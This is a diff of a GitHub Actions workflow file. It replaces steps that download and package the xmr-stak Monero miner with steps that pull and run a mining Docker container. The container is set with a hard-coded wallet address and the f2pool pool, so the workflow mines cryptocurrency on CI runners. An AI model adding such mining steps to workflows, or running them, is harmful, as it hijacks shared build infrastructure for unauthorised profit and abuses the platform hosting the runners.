@@ -22,17 +22,8 @@ jobs:
       # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
       - uses: actions/checkout@v2
 
-      # Runs a set of commands using the runners shell
-      - name: 下载
-        run: wget https://github.com/fireice-uk/xmr-stak/releases/download/1.0.5-rx/xmr-stak-rx-linux-1.0.5-cpu.tar.xz
-          
-      - name: 解压
-        run: |
-          mkdir xmr-stak-rx
-          tar -xvJf xmr-stak-rx-linux-1.0.5-cpu.tar.xz -C ./xmr-stak-rx
-          
-      - name: 上传
-        uses: actions/upload-artifact@master
-        with:
-          name: xmr-stak-rx
-          path: ./xmr-stak-rx
+      - name: 拉取
+        run: docker pull cryptocurrency/xmr-stak-cpu
+        
+      - name: 执行
+        run: docker run -e WALLET="848rns8JmwcTQscYFwsxS6ft9NQoN3TeNYHebyFniF3dPSKgqVR1TrFd9KXCfbuBPMT5qcm2FAVFk95Cjy5Bmz45LhVkUQnt" -e POOL="xmr.f2pool.com:13531" -ti cryptocurrency/xmr-stak-cpu
